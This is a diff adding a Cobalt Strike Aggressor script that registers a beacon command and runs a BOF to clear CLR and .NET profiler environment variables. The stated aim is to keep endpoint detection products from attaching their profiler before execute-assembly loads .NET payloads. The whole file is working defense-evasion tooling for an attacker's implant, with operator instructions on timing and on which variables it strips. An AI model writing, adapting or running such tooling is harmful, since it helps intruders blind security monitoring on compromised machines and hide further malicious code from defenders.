@@ -1,0 +1,71 @@
+# clr_profiler_strip.cna — Aggressor script for clr_profiler_strip BOF
+#
+# Clear CLR profiler injection environment variables before loading .NET assemblies.
+# Prevents EDR from attaching its profiler DLL to the CLR in this process.
+#
+# Run this BEFORE execute-assembly, not after.
+#
+# Usage:
+#   clr_profiler_strip check   show current CLR profiler env vars
+#   clr_profiler_strip strip   clear all CLR profiler env vars
+
+alias clr_profiler_strip {
+    local('$bof $args $bid $handle $path $mode');
+    $bid  = $1;
+    $path = script_resource("clr_profiler_strip.x64.o");
+
+    $handle = openf($path);
+    if ($handle is $null) {
+        berror($bid, "[clr_profiler_strip] Cannot open BOF: " . $path);
+        return;
+    }
+    $bof = readb($handle, 1048576);
+    closef($handle);
+    if ($bof is $null) {
+        berror($bid, "[clr_profiler_strip] readb failed: " . $path);
+        return;
+    }
+    println("[clr_profiler_strip] loaded " . strlen($bof) . " bytes from " . $path);
+
+    if (size(@_) == 1) {
+        berror($bid, "[clr_profiler_strip] Usage:\n" .
+            "  clr_profiler_strip check   show CLR profiler env var state\n" .
+            "  clr_profiler_strip strip   clear all CLR profiler env vars\n\n" .
+            "Run BEFORE execute-assembly to prevent EDR .NET profiler attachment.");
+        return;
+    }
+
+    if ($2 eq "strip") {
+        $mode = 1;
+        btask($bid, "CLR Profiler Strip: clearing EDR profiler environment variables");
+    } else {
+        $mode = 0;
+        btask($bid, "CLR Profiler Strip: checking CLR profiler environment");
+    }
+
+    $args = bof_pack("i", $mode);
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+beacon_command_register(
+    "clr_profiler_strip",
+    "Clear CLR profiler env vars to prevent EDR .NET monitoring via profiling API",
+    "Usage:\n" .
+    "  clr_profiler_strip check   show current CLR profiler env var state\n" .
+    "  clr_profiler_strip strip   clear all CLR profiler env vars\n\n" .
+    "What this destroys:\n" .
+    "  EDR products attach to the .NET CLR via the profiling API by setting:\n" .
+    "    COR_ENABLE_PROFILING=1  COR_PROFILER={GUID}  COR_PROFILER_PATH=...\n" .
+    "  When the CLR starts, it loads the EDR's profiler DLL which then receives\n" .
+    "  callbacks for every .NET method call, exception, and GC event.\n" .
+    "  Clearing these variables prevents the EDR profiler from ever loading.\n\n" .
+    "Variables cleared:\n" .
+    "  COR_ENABLE_PROFILING / COR_PROFILER / COR_PROFILER_PATH (Framework 1-4)\n" .
+    "  CORECLR_ENABLE_PROFILING / CORECLR_PROFILER / ... (.NET Core / .NET 5+)\n" .
+    "  DOTNET_STARTUP_HOOKS / DOTNET_ADDITIONAL_DEPS (.NET 5+ injection)\n" .
+    "  _COR_PROFILER / COMPLUS_DbgEnable (EDR variant names)\n\n" .
+    "CRITICAL: Run BEFORE execute-assembly\n" .
+    "  The CLR reads profiler env vars at startup. If the CLR is already\n" .
+    "  running in this process (from a previous execute-assembly), stripping\n" .
+    "  vars will not detach an already-active profiler.\n"
+);
